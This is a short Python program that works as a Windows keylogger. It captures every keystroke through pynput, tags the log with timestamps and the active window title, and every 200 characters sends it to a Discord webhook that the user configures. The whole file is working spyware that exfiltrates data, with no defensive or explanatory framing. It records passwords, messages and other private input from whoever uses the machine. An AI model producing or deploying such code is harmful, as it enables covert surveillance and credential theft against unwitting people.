from pynput import keyboard
import win32gui
import time
import requests

WEBHOOK_URL = "Add your Webhook URL here"

# Global variables
log = ""
last_window = ""
ctrl_pressed = False

# Obtains the window the user is seeing
def get_active_window():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)

# Stores all the log into a single variable
def send_to_discord(data):
    payload = {"content": f"```{data}```"}
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print("Error sending the log:", e)

# The main function of the program
def on_press(key):
    global log, last_window, ctrl_pressed

    current_window = get_active_window()
    
    # Adds a timestamp and the current window the user is seeing
    if current_window != last_window:
        log += f"\n\n[{time.strftime('%D  ''%H:%M:%S')}] - {current_window}\n"
        last_window = current_window

    # Checks if the CTRL key is being pressed and changes the flag variable
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = True
        return  
    
    # Changes the CTRL + c,v,x to its corresponding action to minimize characters consumption
    try:
        if ctrl_pressed:
            try:
                if key.char.lower() == 'c':
                    print("COPY")
                    log += "[COPY]"
                elif key.char.lower() == 'v':
                    log += "[PASTE]"
                elif key.char.lower() == 'x':
                    log += "[CUT]"
                else:
                    log += f"[CTRL+{key.char.upper()}]"
            except AttributeError:
                log += f"[CTRL+{key}]"
        else:
            log += key.char
    except AttributeError:
        # Ignore arrows
        if key in [keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right,]:
            return
        # Add texting properties like spacing, next line and deleting to the log
        elif key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            if log:
                log = log[:-1]
        elif key == keyboard.Key.tab:
            log += "[TAB]"
        else:
            log += f"[{key.name}]"

# After 200 charcters the log will be sent to the webhook and the log will be cleared 
    if len(log) >= 200:
        send_to_discord(log)
        log = ""

# Change the flag variable to its original value if CTRL key is not pressed
def on_release(key):
    global ctrl_pressed
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = False

# Start listening for keyboard presses
# This will capture every key press and release until you stop the script.
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()